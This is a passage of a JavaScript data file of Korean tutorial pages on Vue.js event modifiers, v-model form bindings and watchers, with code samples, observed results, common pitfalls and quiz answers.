        body: "@click.a.b=\"fn\"은 컴파일러가 fn을 a, b 순서로 감싼 함수입니다. .self는 '통과 검사'(target이 자신인가), .prevent·.stop은 '행동'(막기), .once·.capture·.passive는 addEventListener 옵션입니다. 검사와 행동이 사슬이라 순서가 뜻을 바꿉니다(ㄴ). 검사 앞의 행동은 검사와 무관하게 실행되고(.prevent.self), 검사 뒤의 행동은 통과했을 때만(.self.prevent). 옵션 수식어는 리스너 등록 때 정해져 서로 모순될 수 있습니다(.passive vs .prevent ㄷ). 키·시스템 수식어도 검사이고 .exact는 '다른 검사 전부 거짓'을 더합니다(ㅁ). 처방은 수식어를 왼쪽부터 '검사인가 행동인가 옵션인가'로 읽고, 막고 싶은 범위(자신만/자식까지)에 맞춰 순서를 두는 것입니다.",
        code: "@click.X.Y=\"fn\"  →  listener = X( Y( fn ) ) 꼴 · 왼쒽부터 실행\n검사:  .self · .enter · .ctrl · .exact … → 거짓이면 중단\n행동:  .prevent · .stop                 → 그 자리에서 실행 (검사 앞이면 늘, 뒤면 통과 시만)  (ㄴ)\n옵션:  .once · .capture · .passive       → addEventListener 옵션 · .passive ⟂ .prevent (ㄷ)\n\n.prevent.self :  막기 → 자신? → fn     (자식도 막힘)\n.self.prevent :  자신? → 막기 → fn     (자식 통과)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "이벤트의 특수한 형태가 폼 입력이고, 그것을 양방향으로 묶는 것이 다음 페이지 '폼 입력 바인딩'의 v-model입니다. 실제로 돌려 보면 v-model은 초기 value 속성을 무시했고, .number는 '12abc'를 12로, 'abc'는 그대로 두었습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 테이블 행 클릭으로 상세를 열되 행 안의 체크박스 클릭에는 열리지 않게 하려면? (2) 검색창에서 Enter는 검색, Shift+Enter는 줄바꿈이어야 합니다. 어떻게? (3) 긴 목록의 스크롤 위치를 저장하는 @scroll 핸들러가 스크롤을 버벅이게 합니다. 수식어 하나로 나아질까요?",
        notes: [
          {
            title: "답",
            body: "(1) 행에 @click.self=\"open\"을 쓰면 행 자신을 눌렀을 때만 열립니다. 단 행 안의 <td> 텍스트를 눌러도 target이 td라 .self에 걸러집니다. 그래서 보통은 체크박스 쪽에서 @click.stop을 쓰거나, 행 핸들러 안에서 event.target.closest('input')를 검사합니다. 실제로 돌려 보면 .self 부모는 자식 클릭에 돌지 않았습니다. (2) textarea에 @keydown.enter.exact.prevent=\"search\"를 둡니다. .exact로 Shift 등 다른 수식어가 없는 Enter만 잡고, .prevent로 줄바꿈을 막고 검색합니다. Shift+Enter는 .exact에 걸러져 기본 동작(줄바꿈)이 그대로입니다. keyup이 아니라 keydown이어야 줄바꿈을 막을 수 있습니다. (3) @scroll.passive=\"save\"로 바꾸면 브라우저가 핸들러를 기다리지 않고 스크롤을 진행해 체감이 나아집니다. 핸들러 자체가 무거우면 requestAnimationFrame이나 디바운스로 줄입니다. .prevent와 함께 쓰면 안 됩니다(스크롤은 어차피 막을 수 없는 이벤트입니다).",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Event Handling", href: `${DOCS}/guide/essentials/event-handling` },
      { label: "v-on (Built-in Directives)", href: `${DOCS}/api/built-in-directives#v-on` },
      { label: "Component Events", href: `${DOCS}/guide/components/events` },
    ],
  },

  {
    id: "vg-ess-forms",
    name: "폼 입력 바인딩",
    tagline: "v-model: 값과 이벤트를 한 줄로 — 초기 속성은 무시하고, 수식어가 값을 다듬는다",
    intro:
      "필수 개념 아홉째 페이지입니다. v-model은 <input :value=\"text\" @input=\"text = $event.target.value\">를 한 줄로 줄인 것이고, 요소 종류에 맞춰 짝을 고릅니다. text·textarea는 value/input, checkbox·radio는 checked/change, select는 value/change. 규칙: 'v-model은 요소의 초기 value·checked·selected 속성을 무시한다'(초기값은 JS에서). textarea 안의 보간은 동작하지 않고 v-model로. 체크박스 여럿은 배열(또는 Set)에, radio와 select는 value에, 일치하는 option이 없으면 선택 없음(iOS는 change를 안 내니 빈 placeholder option을 둘 것). :value로 비문자열 값, true-value/false-value. 수식어 .lazy(change 때 동기화), .number(parseFloat, 실패하면 원문, type=\"number\"면 자동), .trim. 실제로 돌려 보면 value=\"속성값\"은 무시되어 ''였고, .lazy는 input에 반응하지 않고 change에만, .number는 '12'→12, '12abc'→12, 'abc'→'abc', .trim은 양끝 공백 제거, select에 없는 값이면 selectedIndex -1, textarea의 보간은 v-model 값에 밀렸습니다. 이 노드의 질문은 하나입니다. v-model은 무엇을 듣고 무엇을 쓰나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "<input v-model=\"text\">는 :value + @input. 요소별 짝: text·textarea → value 프로퍼티·input 이벤트, checkbox·radio → checked·change, select → value·change. 'v-model은 초기 value·checked·selected 속성을 무시한다. 늘 바인딩된 JS 상태를 진실로 본다'. IME(한글·일본어·중국어) 조합 중에는 갱신되지 않으며 그때도 받으려면 :value + @input을 직접. textarea: '보간 {{ text }}는 동작하지 않는다. v-model로'. 체크박스 하나는 불리언, 여럿은 같은 배열(Set도 됨)에 v-model하고 각각 value를 다르게. radio는 value. select는 option의 value(일치하는 것이 없으면 선택 없음 상태. iOS는 그때 change를 안 내니 disabled 빈 option을 첫 줄에). multiple이면 배열. 값 바인딩: 문자열 외의 값은 :value=\"{ number: 123 }\"처럼. 체크박스는 true-value=\"yes\" false-value=\"no\"(v-model에만 영향, value 속성과 무관). 수식어: .lazy는 input 대신 change에 동기화, .number는 parseFloat로 숫자 변환(실패하면 원문 유지, type=\"number\"면 자동 적용), .trim은 양끝 공백 제거.",
        code: "<!-- 전개 -->\n<input v-model=\"text\">  ≡  <input :value=\"text\" @input=\"text = $event.target.value\">\n\n<input v-model=\"msg\" value=\"무시됨\">            <!-- 초기 속성 무시 · 초기값은 ref('…') -->\n<textarea v-model=\"text\"></textarea>           <!-- {{ text }} 보간은 X -->\n<input type=\"checkbox\" v-model=\"checked\">       <!-- boolean -->\n<input type=\"checkbox\" value=\"Jack\" v-model=\"names\"><input type=\"checkbox\" value=\"John\" v-model=\"names\">   <!-- names: [] -->\n<input type=\"radio\" value=\"One\" v-model=\"picked\">\n<select v-model=\"selected\"><option disabled value=\"\">Please select one</option><option>A</option></select>   <!-- iOS 대비 빈 option -->\n<select v-model=\"multi\" multiple>…</select>     <!-- 배열 -->\n<input type=\"checkbox\" v-model=\"toggle\" true-value=\"yes\" false-value=\"no\">\n<input type=\"radio\" v-model=\"pick\" :value=\"{ number: 123 }\">   <!-- 비문자열 -->\n\n<!-- 수식어 -->\n<input v-model.lazy=\"msg\">     <!-- change 때 -->\n<input v-model.number=\"age\">   <!-- parseFloat · 실패하면 원문 -->\n<input v-model.trim=\"msg\">",
        terms: [
          {
            term: "v-model",
            body: "값 바인딩과 입력 이벤트 리스너를 한 디렉티브로 묶은 양방향 바인딩입니다. 요소 종류를 보고 value/input, checked/change, value/change 짝을 고르고, 컴포넌트에서는 modelValue prop과 update:modelValue 이벤트가 됩니다(컴포넌트 v-model 노드). 실제로 컴파일 출력은 \"onUpdate:modelValue\": $event => (v = $event)와 withDirectives(…, [[vModelText, v, undefined, { trim, number }]])였습니다. 런타임 디렉티브 vModelText가 요소에 리스너를 달고 수식어를 적용합니다.",
          },
          {
            term: "IME 조합 (composition)",
            body: "한글·일본어·중국어 입력처럼 글자가 완성되기 전 중간 상태를 거치는 입력 방식입니다. 브라우저는 compositionstart·compositionupdate·compositionend 이벤트를 내고, Vue의 v-model은 조합 중에는 모델을 갱신하지 않습니다(완성된 글자만). 조합 중의 글자까지 받아야 하면 v-model 대신 :value와 @input을 직접 씁니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 <input v-model=\"s.text\" value=\"속성값\">의 DOM value는 ''였습니다(초기 속성 무시, 모델이 ''). 사용자 입력을 흉내 내 value를 바꾸고 input 이벤트를 내니 s.text가 '타이핑'. .lazy 입력은 input 이벤트 뒤 ''(반응 없음), change 이벤트 뒤 'lazy-change'. .number는 '12' → 12(number), '12abc' → 12(parseFloat), 'abc' → 'abc'(string, 원문 유지). .trim은 '  양끝  ' → '양끝'. select의 모델이 어떤 option과도 일치하지 않으면 selectedIndex -1. textarea에 {{ s.ta }}와 v-model을 같이 두니 value는 모델 '초기'였습니다(보간은 무시). radio는 change로 'y'. 체크박스 둘을 같은 틱에 코드로 연속 토글하니 배열에 뒤의 하나만 남았습니다. v-model 체크박스 핸들러가 DOM 갱신 전의 모델 사본을 기준으로 합치기 때문에, 코드로 여러 체크박스를 한 틱에 바꾸면 틀어질 수 있습니다(사용자 클릭은 틱마다 하나라 문제없음). 컴파일 출력: <input v-model.trim.number=\"v\">는 \"onUpdate:modelValue\": _cache[0] || (_cache[0] = $event => ((_ctx.v) = $event))와 withDirectives(…, [[_vModelText, _ctx.v, void 0, { trim: true, number: true }]]), 패치 플래그 512 /* NEED_PATCH */. 서버 렌더에서 <textarea value=\"v\">는 <textarea>v</textarea>, <select value=\"b\">는 두 번째 option에 selected가 붙었습니다.",
        code: "// Chrome 156 · v-model\n<input v-model value=\"속성값\">    → DOM value ''        (초기 속성 무시)\n.lazy:   input 이벤트 → ''  ·  change 이벤트 → 'lazy-change'\n.number: '12' → 12 (number) · '12abc' → 12 · 'abc' → 'abc' (string)\n.trim:   '  양끝  ' → '양끝'\nselect 불일치 → selectedIndex -1\n<textarea v-model>{{ s.ta }}</textarea> → value = 모델 '초기' (보간 무시)\n체크박스 둘을 같은 틱에 코드로 토글 → ['B'] 만 (DOM 갱신 전 사본 기준 — 사용자 클릭은 무관)\n\n// 컴파일 출력\n<input v-model.trim.number=\"v\">\n→ _withDirectives(_createElementVNode(\"input\", { \"onUpdate:modelValue\": _cache[0] || (_cache[0] = $event => ((_ctx.v) = $event)) }, null, 512 /* NEED_PATCH */),\n   [[_vModelText, _ctx.v, void 0, { trim: true, number: true }]])\n\n// SSR\n<textarea value=\"v\"> → <textarea>v</textarea>   <select value=\"b\"> → <option value=\"b\" selected>",
      },
      {
        label: "문제: 나이 입력이 문자열로 서버에 가서 검증에 걸린다",
        body: "<input v-model=\"age\">로 받은 값이 '25'(문자열)이라 서버의 숫자 검증에 걸립니다. 텍스트 input의 value는 늘 문자열입니다. 처방은 v-model.number입니다. parseFloat로 바꾸고 실패하면 원문을 둡니다(실제로 '12abc'는 12, 'abc'는 'abc'). type=\"number\"를 주면 .number가 자동 적용되지만 빈 값은 ''로 옵니다. 숫자가 아니면 아예 거부해야 하면 computed { get, set }으로 감싸거나 제출 때 Number()와 Number.isFinite로 검증합니다. 비슷한 문제가 체크박스에서는 'on' 문자열 대신 불리언(v-model 기본), 여러 선택은 배열, 라디오·셀렉트의 비문자열 값은 :value=\"객체\"로 풉니다. 전부 '진실은 JS 상태에 있고 DOM 속성은 그 반영'이라는 v-model의 방향입니다.",
      },
      {
        label: "문제가 나는 경우: DOM 을 진실로 볼 때",
        body: "경우 ㄱ, 문자열 숫자입니다. 위의 사고입니다. 경우 ㄴ, value 속성으로 초기값. 무시됩니다(실제로 ''). ref 초기값. 경우 ㄷ, textarea에 보간. 무시. v-model. 경우 ㄹ, 체크박스 여럿에 각각 불리언 v-model을 기대하며 같은 배열을 안 줌. 배열 v-model + value. 경우 ㅁ, select 모델이 어느 option과도 안 맞음. 선택 없음(-1), iOS는 change 안 냄. disabled 빈 option. 경우 ㅂ, .lazy인데 타이핑마다 검증을 기대. change 때만. 수식어 제거. 경우 ㅅ, .number에 'abc'가 NaN이길 기대. 원문 유지(실제로). 별도 검증. 경우 ㅇ, .trim인데 중간 공백도 지워질 거라 기대. 양끝만. 경우 ㅈ, true-value가 value 속성을 바꿀 거라 기대. v-model에만 영향. 경우 ㅊ, IME 조합 중 글자가 안 들어와 버그로 봄. 설계. :value + @input. 경우 ㅋ, v-model과 :value를 같은 요소에. 충돌. 하나만. 경우 ㅌ, 코드로 여러 체크박스를 한 틱에 바꾸고 배열이 전부 반영되길 기대. 뒤의 것만 남을 수 있음(실제로). 모델 배열을 직접 바꾼다. 경우 ㅍ, 컴포넌트에 v-model을 걸고 네이티브처럼 동작하길 기대. modelValue/update:modelValue 계약(컴포넌트 v-model 노드).",
        code: "경우               언제 생기나                        겉모습                                처방\nㄱ 문자열 숫자       <input v-model=\"age\">              '25'                                 .number · 검증\nㄴ 속성 초기값       value=\"x\"                          무시 → '' (실제로)                     ref('x')\nㄷ textarea 보간     {{ text }} 안에                     무시                                 v-model\nㄹ 체크박스 배열     여러 개 개별 기대                    boolean 하나                           같은 배열 + value\nㅁ select 불일치     모델 값이 option 에 없음               selectedIndex -1 · iOS change 없음      disabled 빈 option\nㅂ lazy 검증        타이핑마다 기대                      change 때만                           수식어 제거\nㅅ number NaN 기대   'abc'                              'abc' 원문 (실제로)                    별도 검증\nㅇ trim 중간        '  a  b  '                          'a  b'                               replace\nㅈ true-value 속성   value 속성 기대                      v-model 에만                          -\nㅊ IME 조합         한글 입력 중                         갱신 안 됨 (설계)                      :value + @input\nㅋ v-model + :value  둘 다                              충돌                                 하나만\nㅌ 한 틱 다중 토글    코드로 체크박스 여럿                  뒤의 것만 (실제로)                     모델 배열 직접\nㅍ 컴포넌트 v-model   <Comp v-model>                     계약 필요                             modelValue · defineModel",
        codeLang: "text",
      },
      {
        label: "문제의 구조: v-model 은 'JS 상태가 진실' 이라는 방향을 요소마다 다른 짝으로 구현한다",
        body: "v-model의 한 가지 원칙은 '진실은 바인딩된 JS 상태'입니다. 그래서 DOM의 초기 속성은 무시되고(ㄴ, ㄷ), DOM에서 들어오는 값은 수식어로 다듬어 상태의 타입에 맞추고(ㄱ, ㅅ, ㅇ), 상태에 없는 값은 DOM에서도 선택되지 않습니다(ㅁ). 원칙은 하나지만 요소마다 '값이 어디 있고 언제 바뀌나'가 달라 짝이 다릅니다. text는 value/input(조합 중 제외 ㅊ), checkbox는 checked/change(여럿이면 배열 ㄹ), select는 value/change. .lazy는 짝의 이벤트를 바꾸고(ㅂ), true-value는 상태에 들어갈 값을 바꿉니다(ㅈ). 짝은 하나의 요소에 하나라 :value와 공존하지 못하고(ㅋ), 핸들러는 틱 단위로 상태 사본을 보니 한 틱의 다중 변경은 어긋날 수 있습니다(ㅌ). 처방은 '초기값·검증·변환은 전부 JS 상태 쪽에서'입니다.",
        code: "원칙:  진실 = JS 상태  →  DOM 초기 속성 무시 (ㄴ ㄷ) · 없는 값은 선택 없음 (ㅁ)\n짝:    text     value / input  (IME 조합 중 제외 ㅊ)\n       checkbox checked / change  (여럿 → 배열 ㄹ · true-value 로 들어갈 값 ㅈ)\n       radio    checked / change · select  value / change\n수식어: .lazy 이벤트 교체 (ㅂ) · .number .trim 들어오는 값 다듬기 (ㄱ ㅅ ㅇ)\n제약:   요소당 짝 하나 (ㅋ) · 틱 단위 사본 (ㅌ)\n\n초기값 · 검증 · 변환 → JS 상태 쪽에서",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "값이 바뀌는 순간에 바깥 일을 하는 것이 다음 페이지 '감시자'입니다. 실제로 돌려 보면 flush 순서는 sync → (동기 코드 끝) → pre(옛 DOM) → post(새 DOM)였고, watchEffect는 첫 await 전까지만 추적했습니다.",
      },
      {
        label: "확인 질문",
        body: "주문 폼입니다. (1) 수량 <input>은 숫자여야 하고 빈 값이면 1로. 어떻게? (2) 배송 옵션 select의 초기 선택이 안 되어 있고 iOS에서 첫 선택이 반응하지 않습니다. 왜고 어떻게? (3) 메모 textarea를 서버 저장은 포커스가 빠질 때만 하고 싶습니다. 수식어?",
        notes: [
          {
            title: "답",
            body: "(1) <input type=\"number\" v-model.number=\"qty\" min=\"1\">로 받되 빈 값은 ''로 오고 'abc'는 type=number가 막아 줍니다. 실제로 .number는 parseFloat 실패 시 원문을 두므로 저장 직전에 const n = Number(qty.value); const safe = Number.isFinite(n) && n >= 1 ? n : 1로 정리하거나, computed({ get: () => qty.value, set: (v) => { qty.value = Number.isFinite(+v) && +v >= 1 ? +v : 1 } })로 감싸 v-model에 그 computed를 묶습니다. (2) 모델 값이 어느 option의 value와도 일치하지 않으면 선택 없음 상태입니다(실제로 selectedIndex -1). iOS는 그 상태에서 첫 선택에 change를 내지 않습니다. 문서의 처방대로 <option disabled value=\"\">배송 옵션 선택</option>을 첫 줄에 두고 모델 초기값을 ''로 하면 placeholder가 선택된 상태가 되어 iOS에서도 첫 변경이 change를 냅니다. (3) v-model.lazy=\"memo\"입니다. input 이벤트 대신 change(포커스가 빠질 때, Enter 등)에 동기화됩니다. 실제로 input 이벤트에는 반응하지 않고 change에만 반응했습니다. 모델이 바뀌는 시점이 곧 저장 시점이니 watch(memo, save)로 저장을 걸면 됩니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Form Input Bindings", href: `${DOCS}/guide/essentials/forms` },
      { label: "v-model (Built-in Directives)", href: `${DOCS}/api/built-in-directives#v-model` },
      { label: "Component v-model", href: `${DOCS}/guide/components/v-model` },
    ],
  },

  {
    id: "vg-ess-watchers",
    name: "감시자",
    tagline: "watch 는 '이 소스가 바뀌면', watchEffect 는 '읽은 것이 바뀌면' — 그리고 언제(flush) 도나",
    intro:
      "필수 개념 열째 페이지입니다. computed가 파생 값이라면 감시자는 '값이 바뀔 때 바깥 일(비동기, DOM, 로그)을 하는' 장치입니다. watch(source, cb, options)는 소스를 명시합니다. ref, getter, reactive 객체(자동 깊음), 배열. 옵션 deep(3.5+ 숫자 깊이), immediate, once(3.4+), flush('pre' 기본, 'post', 'sync'). watchEffect(fn)은 동기 실행 중 읽은 것을 자동 추적하며 즉시 한 번 돕니다. 정리는 onCleanup 인자 또는 3.5+ onWatcherCleanup(). 동기 생성된 감시자는 컴포넌트와 함께 멈추고, 비동기로 만든 것은 직접 멈춰야 합니다. 실제로 돌려 보면 flush 순서는 sync → (동기 코드 끝) → pre → post였고, pre 콜백의 DOM은 옛 값, post는 새 값이었으며, watchEffect는 첫 await 전까지만 추적했고(runs 2에서 멈춤), ref([])의 push는 deep 없이는 감지되지 않았고, reactive 소스는 자동으로 깊었고 getter 소스는 얕았습니다. 이 노드의 질문은 하나입니다. 무엇을, 얼마나 깊게, 언제 보나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "watch(source, (newValue, oldValue, onCleanup) => {}, options). 소스 넷: ref(count), getter(() => x.value + y.value), reactive 객체(obj — 암묵적으로 deep), 배열([x, () => y.value]). 함정: watch(obj.count, …)는 숫자를 넘기는 것이라 안 됨. getter로. reactive 객체를 직접 넘기면 중첩 변경에도 콜백이 돌고 newValue === oldValue. getter 소스는 '반환값이 바뀔 때만'(얕음), 중첩까지 보려면 { deep: true }. deep은 비용이 크고 3.5+부터 숫자로 최대 깊이. immediate: true면 만들 때 한 번(created 직전). once: true(3.4+)면 한 번 뒤 멈춤. watchEffect(() => { … })는 즉시 돌고 동기 실행 중 읽은 반응형 의존을 추적. '동기 실행 중에만 추적한다. 비동기 콜백이면 첫 await 전에 읽은 것만'. 정리: onCleanup(fn)(watch는 셋째 인자, watchEffect는 첫 인자) 또는 3.5+ onWatcherCleanup(fn)(동기 호출 필수). flush: 기본 'pre'(부모 갱신 뒤, 소유 컴포넌트 DOM 갱신 전), 'post'(DOM 갱신 뒤. watchPostEffect), 'sync'(동기. watchSyncEffect. 묶음이 없어 배열처럼 여러 번 바뀌는 소스에는 피할 것). 멈추기: setup·<script setup>에서 동기로 만든 것은 자동, 비동기로 만든 것은 반환된 stop 함수로. 3.5+ 핸들은 pause·resume·stop. this.$watch도 unwatch 반환.",
        code: "import { watch, watchEffect, watchPostEffect, onWatcherCleanup } from 'vue'\n\nwatch(question, async (newQ, oldQ, onCleanup) => {        // ref 소스 · 바뀔 때만\n  const ac = new AbortController(); onCleanup(() => ac.abort())\n  answer.value = await fetchAnswer(newQ, ac.signal)\n})\nwatch(() => obj.count, (v) => …)                            // getter (obj.count 를 직접 넘기면 X)\nwatch(obj, () => …)                                          // reactive 직접 → 암묵적 deep\nwatch(() => obj.some, () => …, { deep: true })               // getter + deep\nwatch([x, () => y.value], ([nx, ny]) => …)                   // 배열\nwatch(src, cb, { immediate: true, once: true, flush: 'post' })\n\nwatchEffect(async () => {                                   // 즉시 1회 · 읽은 것 자동 추적\n  const res = await fetch(`/api/${id.value}`)                // id 는 추적 · await 뒤 읽은 것은 X\n  data.value = await res.json()\n})\nconst stop = watchEffect(() => …); stop()                    // 비동기로 만들었으면 직접",
        terms: [
          {
            term: "flush",
            body: "감시자 콜백이 '언제' 도는지입니다. 'pre'(기본): 소스가 바뀐 뒤 소유 컴포넌트가 다시 렌더되기 전, 그래서 콜백 안에서 DOM을 읽으면 옛 값(실제로 'DOM=0-0'). 'post': 컴포넌트 DOM 갱신 뒤, DOM을 읽으면 새 값(실제로 'DOM=2-1'). 'sync': 상태가 바뀌는 순간 동기로, 묶음 없이 변경마다. 실제로 돌려 보면 sync는 동기 코드가 끝나기도 전에 두 번 돌았고 pre·post는 nextTick 뒤에 한 번씩이었습니다.",
          },
          {
            term: "watch 와 watchEffect",
            body: "watch는 소스를 명시하고 콜백은 소스가 바뀔 때만 돕니다. 바뀐 값과 옛 값을 받고, 콜백 안에서 읽는 다른 반응형 값은 추적되지 않습니다. watchEffect는 소스 없이 함수 하나이고 즉시 한 번 돌며 동기 실행 중 읽은 모든 반응형 값을 추적합니다. 옛 값은 없습니다. '이 값이 바뀌면'이 명확하고 옛 값이 필요하면 watch, 여러 값을 읽어 한 가지 효과를 내면 watchEffect입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Node에서 소스 종류를 비교했습니다. watch(n)은 n이 0→2(같은 틱 두 번 ++)로 바뀌자 한 번 'watch(n) 0→2'. watch(() => o.a.b)는 b 변경에 반응, watch(o)(reactive 직접)는 중첩 b 변경에도 반응(자동 deep), watch(() => o.a)는 b 변경에 반응 없음(얕음), 같은 getter에 { deep: true }는 반응. immediate는 즉시 'v=0'. once는 한 번 뒤 멈춤. watchEffect는 즉시 1회 뒤 변경마다. ref([1])에 push(2)는 watch(arrR) 콜백이 안 돌았고 { deep: true }면 돌았으며, arrR.value = [9] 교체는 둘 다 돌았습니다. flush: f.value = 1 뒤 order는 ['sync', '(동기 코드 끝)', 'pre', 'post']. watchEffect(async () => { a.value; await …; b.value })에서 a 변경은 다시 돌렸지만 b 변경은 안 돌렸습니다(runs 2). effectScope 안의 watchEffect는 scope.stop() 뒤 변경을 무시했고 onScopeDispose가 돌았습니다. customRef로 만든 debounce ref는 'a', 'ab'를 연달아 써도 watch가 'ab' 한 번. Chrome에서 같은 소스에 pre·post·sync 셋을 걸고 DOM을 읽으니 sync는 'DOM=0-0'(두 번, 변경마다), pre는 'DOM=0-0'(갱신 전), post는 'DOM=2-1'(갱신 뒤)였습니다.",
        code: "// Node 24 · vue 3.5.45 — 소스 종류\nwatch(n)                     n: 0 → 2 (같은 틱 ++ 두 번) → 'watch(n) 0→2' 한 번\nwatch(() => o.a.b)           b 변경 → 돈다\nwatch(o)                     reactive 직접 → 중첩 b 변경에도 돈다 (암묵적 deep)\nwatch(() => o.a)             getter 얕음 → b 변경에 안 돈다   · { deep: true } → 돈다\nwatch(arrR) (ref([]))         push → 안 돈다 · { deep: true } → 돈다 · .value = [9] 교체 → 둘 다\n{ immediate: true } → 즉시 'v=0'   · { once: true } → 한 번 뒤 멈춤   · watchEffect → 즉시 1회\n\n// flush 순서\nf.value = 1  →  ['sync', '(동기 코드 끝)', 'pre', 'post']\n// Chrome — DOM 상태\nsync: 'DOM=0-0' (변경마다, 묶음 없음) · pre: 'DOM=0-0' (갱신 전) · post: 'DOM=2-1' (갱신 뒤)\n\n// 비동기 watchEffect — 첫 await 전까지만\nwatchEffect(async () => { a.value; await Promise.resolve(); b.value })   a++ → runs 2 · b++ → runs 2 (b 미추적)\n\n// effectScope · customRef\nscope.stop() 뒤 변경 무시 · onScopeDispose 호출   ·   debounce customRef: 'a','ab' 연속 쓰기 → watch 'ab' 한 번",
      },
      {
        label: "문제: 검색어를 바꾸면 옛 요청의 결과가 새 결과를 덮어쓴다",
        body: "watch(query, async (q) => { results.value = await search(q) }). 'ab'를 치고 바로 'abc'를 치면 'ab' 요청이 늦게 끝나 'abc' 결과를 덮습니다. 경쟁 조건입니다. 처방은 정리 함수입니다. 콜백의 셋째 인자 onCleanup(또는 3.5+ onWatcherCleanup)에 '다음 실행 전에 할 일'을 등록합니다. AbortController를 만들어 onCleanup(() => ac.abort())하고 fetch에 signal을 넘기면 옛 요청이 취소됩니다. 또는 플래그 let stale = false; onCleanup(() => stale = true); const r = await search(q); if (!stale) results.value = r. onWatcherCleanup은 동기로 불러야 하므로 await 뒤에 부르면 안 됩니다(onCleanup 인자는 그 제약이 없음). 입력마다 요청을 보내지 않으려면 customRef로 debounce한 ref를 소스로 씁니다(실제로 'ab' 한 번만 콜백).",
      },
      {
        label: "문제가 나는 경우: 소스·깊이·시점을 잘못 잡을 때",
        body: "경우 ㄱ, 경쟁 조건입니다. 위의 사고입니다. 경우 ㄴ, watch(obj.count, …). 숫자를 넘겨 경고·무반응. getter. 경우 ㄷ, getter 소스에 중첩 변경 기대. 얕음(실제로). deep 또는 reactive 직접. 경우 ㄹ, ref([])의 push 감지 기대. deep 없이는 안 됨(실제로). deep 또는 교체. 경우 ㅁ, deep으로 거대 객체. 매 변경마다 전체 순회. 3.5 숫자 깊이, 또는 필요한 경로만 getter. 경우 ㅂ, pre에서 DOM 측정. 옛 DOM(실제로). post. 경우 ㅅ, sync로 배열 감시. 변경마다 콜백, 묶음 없음. pre. 경우 ㅇ, watchEffect의 await 뒤 의존. 추적 안 됨(실제로). await 전에 읽거나 watch로 소스 명시. 경우 ㅈ, setTimeout 안에서 만든 watch를 안 멈춤. 컴포넌트가 사라져도 남음(누수). stop 보관. 경우 ㅊ, immediate 콜백에서 oldValue 사용. 첫 호출은 undefined. 경우 ㅋ, watch 콜백에서 소스 자신을 바꿔 루프. 조건 분기. 경우 ㅌ, watch로 파생 값을 만듦(watch(a, () => b.value = a.value * 2)). computed로. 경우 ㅍ, onWatcherCleanup을 await 뒤에 호출. 동기 필수. onCleanup 인자로.",
        code: "경우               언제 생기나                        겉모습                                처방\nㄱ 경쟁 조건        async 콜백 연속                     옛 결과가 덮음                          onCleanup + abort · debounce ref\nㄴ 값 넘김         watch(obj.count)                   경고 · 무반응                           watch(() => obj.count)\nㄷ getter 얕음      watch(() => o.a) · a.b 변경         안 돎 (실제로)                         deep · watch(o)\nㄹ ref 배열 push    watch(arrRef) · push               안 돎 (실제로)                         deep · 교체\nㅁ deep 거대       watch(big, …, { deep: true })       전체 순회 비용                          deep: 2 · 경로 getter\nㅂ pre 측정        콜백에서 getBoundingClientRect      옛 DOM (실제로)                        flush: 'post'\nㅅ sync 배열       flush: 'sync' + 배열                변경마다 · 묶음 없음                     pre\nㅇ await 뒤 의존    watchEffect(async)                 미추적 (실제로 runs 2)                  await 전 읽기 · watch\nㅈ 비동기 생성      setTimeout 안 watch                누수                                  stop 보관 · 동기 생성\nㅊ immediate old    첫 호출 oldValue                   undefined                             분기\nㅋ 자기 변경 루프    콜백이 소스 변경                     무한                                  조건\nㅌ 파생을 watch 로   b = f(a) 를 watch                   한 틱 늦음 · 중복                      computed\nㅍ 늦은 cleanup     await 뒤 onWatcherCleanup           경고 · 무시                            동기 · onCleanup 인자",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 감시자는 세 질문 — 무엇을(소스), 얼마나(깊이), 언제(flush)",
        body: "감시자의 사고는 세 질문 중 하나를 잘못 답한 것입니다. 무엇을: watch는 소스를 명시하므로 '값'이 아니라 '읽는 길'(ref·getter·reactive)을 넘겨야 하고(ㄴ), watchEffect는 '동기 실행 중 읽은 것'이 소스라 await 뒤는 밖입니다(ㅇ). 얼마나: reactive 직접은 깊고 getter·ref는 얕아(ㄷ, ㄹ) deep이 필요하되 비용이 있습니다(ㅁ). 언제: pre는 DOM 전, post는 DOM 뒤, sync는 즉시·묶음 없음(ㅂ, ㅅ). 그리고 수명: 동기 생성은 컴포넌트와 함께, 비동기 생성은 직접(ㅈ), 연속 실행은 정리로 잇습니다(ㄱ, ㅍ). 파생 값은 감시자의 일이 아닙니다(ㅌ). 처방은 감시자를 쓰기 전에 '이것은 파생 값인가(computed), 바깥 일인가(watch)'를 먼저 가르고, 바깥 일이면 세 질문에 답하는 것입니다.",
        code: "파생 값인가? → computed (ㅌ)   /   바깥 일인가? → 감시자 ↓\n무엇을   watch: ref · getter · reactive · 배열 (값 X ㄴ)   watchEffect: 동기 중 읽은 것 (await 뒤 X ㅇ)\n얼마나   reactive 직접 = deep · getter/ref = 얕음 (ㄷ ㄹ) · deep 비용 (ㅁ)\n언제     sync (즉시·묶음 X ㅅ) → 동기 끝 → pre (DOM 전 ㅂ) → post (DOM 뒤)\n수명     동기 생성 = 자동 멈춤 · 비동기 = stop (ㅈ) · 연속 실행 = onCleanup (ㄱ ㅍ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "반응성 밖의 DOM을 직접 만져야 할 때가 다음 페이지 '템플릿 ref'입니다. 실제로 돌려 보면 ref는 setup과 beforeMount에서 null, mounted에서 요소였고, <script setup> 컴포넌트의 ref는 expose한 것만 보였습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 사용자 설정 객체 prefs(reactive, 중첩 깊음)가 바뀌면 localStorage에 저장하려 합니다. 어떻게 쓰고 비용은? (2) 목록이 바뀐 뒤 마지막 항목으로 스크롤해야 합니다. watch 옵션은? (3) watchEffect 안에서 await fetch(url.value) 뒤 filter.value로 결과를 거르는데 filter를 바꿔도 다시 안 돕니다. 왜고 어떻게?",
        notes: [
          {
            title: "답",
